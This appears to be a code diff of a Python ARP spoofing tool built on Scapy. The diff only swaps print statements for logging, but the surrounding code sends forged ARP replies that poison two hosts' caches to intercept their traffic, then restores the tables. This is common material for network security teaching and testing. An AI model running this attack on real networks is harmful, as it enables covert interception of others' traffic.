@@ -41,31 +41,25 @@ class ArpSpoof:
         logger.add_time()
 
         interface_header_msg = 'Interface : ' + self.local_interface
-        print(interface_header_msg)
         logger.log(interface_header_msg)
         self.get_local_mac() # get interface mac address
 
         # print mac address if the interface name is correct
         interface_mac_msg = 'Interface mac : ' + self.interface_mac
-        print(interface_mac_msg)
         logger.log(interface_mac_msg)
 
         self.get_targets_mac() # get targets mac addresses
         # print targets information
         target1_ip_msg = 'Target 1 : ' + self.target1_ip
-        print(target1_ip_msg)
         logger.log(target1_ip_msg)
 
         target1_mac_msg = 'Target 1\'s mac : ' + self.target1_mac
-        print(target1_mac_msg)
         logger.log(target1_mac_msg)
 
         target2_ip_msg = 'Target 2 : ' + self.target2_ip
-        print(target2_ip_msg)
         logger.log(target2_ip_msg)
 
         target2_mac_msg = 'Target 2\'s mac : ' + self.target2_mac
-        print(target2_mac_msg)
         logger.log(target2_mac_msg)
 
         self.poison_arp_cache()
@@ -77,12 +71,10 @@ class ArpSpoof:
             self.interface_mac = get_if_hwaddr(self.local_interface)
         except ValueError :
             error_msg = 'error : Invalid interface name --> ' + self.local_interface
-            print(error_msg)
             logger.log(error_msg)
             exit()
         except OSError :
             error_msg = 'error : Invalid interface name --> ' + self.local_interface
-            print(error_msg)
             logger.log(error_msg)
             exit()
 
@@ -94,14 +86,12 @@ class ArpSpoof:
             self.target1_mac = getmacbyip(self.target1_ip)
             if self.target1_mac == None : # check if machine exists or responds to ARP request
                 not_responding_arp_req_msg = 'Target ' + self.target1_ip + ' didn\'t respond tp ARP request sent by machine'
-                print(not_responding_arp_req_msg)
                 logger.log(not_responding_arp_req_msg)
                 exit()
 
         except OSError :
             # ip validation
             invalid_ip_msg = 'Invalid IP address --> ' + self.target1_ip
-            print(invalid_ip_msg)
             logger.log(invalid_ip_msg)
             exit()
 
@@ -110,14 +100,12 @@ class ArpSpoof:
             self.target2_mac = getmacbyip(self.target2_ip)
             if self.target2_mac == None: # check if machine exists or responds to ARP request
                 not_responding_arp_req_msg = 'Target ' + self.target2_ip + ' didn\'t respond tp ARP request sent by machine'
-                print(not_responding_arp_req_msg)
                 logger.log(not_responding_arp_req_msg)
                 exit()
 
         except OSError :
             # ip validation
             invalid_ip_msg = 'Invalid IP address --> ' + self.target2_ip
-            print(invalid_ip_msg)
             logger.log(invalid_ip_msg)
             exit()
 
@@ -129,13 +117,11 @@ class ArpSpoof:
                 spoofed_arp_packet_target1 = ARP(op=2, psrc=self.target1_ip, pdst=self.target2_ip, hwdst=self.target2_mac ,hwsrc=self.interface_mac) # spoof target 1
                 send(spoofed_arp_packet_target1 ,verbose=0)
                 send_arp_packet1_msg = '[ARP : ' + self.target1_ip + ' --> ' + self.target2_ip + ']--> mac : ' + self.interface_mac
-                print(send_arp_packet1_msg)
                 logger.log(send_arp_packet1_msg)
 
                 spoofed_arp_packet_target2 = ARP(op=2, psrc=self.target2_ip, pdst=self.target1_ip, hwdst=self.target1_mac, hwsrc=self.interface_mac)  # spoof target 2
                 send(spoofed_arp_packet_target2 ,verbose=0)
                 send_arp_packet2_msg = '[ARP : ' + self.target2_ip + ' --> ' + self.target1_ip + ']--> mac : ' + self.interface_mac
-                print(send_arp_packet2_msg)
                 logger.log(send_arp_packet2_msg)
 
             except KeyboardInterrupt :
@@ -147,7 +133,6 @@ class ArpSpoof:
 
         print('\n')
         arp_restore_packet_msg = '[Send last 2 ARP packets for restoring targets ARP tables] --> 5 times'
-        print(arp_restore_packet_msg)
         logger.log(arp_restore_packet_msg)
 
         arp_restore_packets = 5 # for sending 2 packets 5 times -> 2*5
@@ -162,12 +147,10 @@ class ArpSpoof:
                 send(correct_arp_packet_target2 ,verbose=0)
         except:
             error_msg = 'ARP cache restore failed !'
-            print(error_msg)
             logger.log(error_msg)
             exit()
         else:
             attack_finish_msg = 'The attack has finished.'
-            print(attack_finish_msg)
             logger.log(attack_finish_msg)
             exit()
 
